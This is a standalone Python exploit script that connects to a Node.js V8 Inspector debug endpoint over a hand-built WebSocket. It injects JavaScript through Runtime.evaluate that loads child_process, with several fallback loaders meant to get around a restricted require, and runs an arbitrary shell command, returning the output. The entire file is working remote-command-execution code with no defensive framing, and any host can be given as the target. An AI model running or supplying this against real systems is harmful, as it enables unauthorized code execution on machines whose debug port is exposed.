#!/usr/bin/env python3
"""Execute a command through a local Node.js V8 Inspector endpoint."""

import base64
import json
import os
import socket
import struct
import sys
from urllib.parse import urlparse


if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} 'ws://127.0.0.1:9229/<id>' 'command'")
    sys.exit(1)

url = sys.argv[1]
command = " ".join(sys.argv[2:]) or "id"
parsed = urlparse(url)
host = parsed.hostname
port = parsed.port or 80
path = parsed.path

sock = socket.create_connection((host, port))
key = base64.b64encode(os.urandom(16)).decode()
request = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n\r\n"
)
sock.sendall(request.encode())

response = sock.recv(4096)
if b"101 Switching Protocols" not in response:
    print("[-] WebSocket handshake failed")
    print(response.decode(errors="ignore"))
    sys.exit(1)

javascript = r"""
(() => {
  const cmd = CMD_PLACEHOLDER;
  let cp = null;
  const errors = [];

  const loaders = [
    () => require('child_process'),
    () => process.mainModule.require('child_process'),
    () => process.mainModule.constructor._load('child_process'),
    () => global.process.mainModule.constructor._load('child_process')
  ];

  for (const loader of loaders) {
    try {
      cp = loader();
      if (cp) break;
    } catch (error) {
      errors.push(error.message);
    }
  }

  if (!cp) {
    return 'FAILED_TO_LOAD_CHILD_PROCESS\n' + errors.join('\n');
  }

  return cp.execSync(cmd).toString();
})()
"""

expression = javascript.replace("CMD_PLACEHOLDER", json.dumps(command))
payload = json.dumps(
    {
        "id": 1,
        "method": "Runtime.evaluate",
        "params": {"expression": expression, "returnByValue": True},
    }
).encode()

mask = os.urandom(4)
header = bytearray([0x81])
length = len(payload)

if length < 126:
    header.append(0x80 | length)
elif length < 65536:
    header.append(0x80 | 126)
    header += struct.pack(">H", length)
else:
    header.append(0x80 | 127)
    header += struct.pack(">Q", length)

masked = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
sock.sendall(header + mask + masked)


def recv_exact(length):
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return data


def recv_frame():
    frame_header = recv_exact(2)
    if not frame_header:
        return b""

    _, second = frame_header
    length = second & 0x7F

    if length == 126:
        length = struct.unpack(">H", recv_exact(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", recv_exact(8))[0]

    if second & 0x80:
        frame_mask = recv_exact(4)
        data = recv_exact(length)
        return bytes(
            byte ^ frame_mask[index % 4] for index, byte in enumerate(data)
        )

    return recv_exact(length)


data = recv_frame()
try:
    result = json.loads(data.decode(errors="ignore"))
    runtime_result = result.get("result", {}).get("result", {})
    if "value" in runtime_result:
        print(runtime_result["value"], end="")
    else:
        print(json.dumps(result, indent=2))
except (json.JSONDecodeError, UnicodeDecodeError):
    print(data.decode(errors="ignore"))

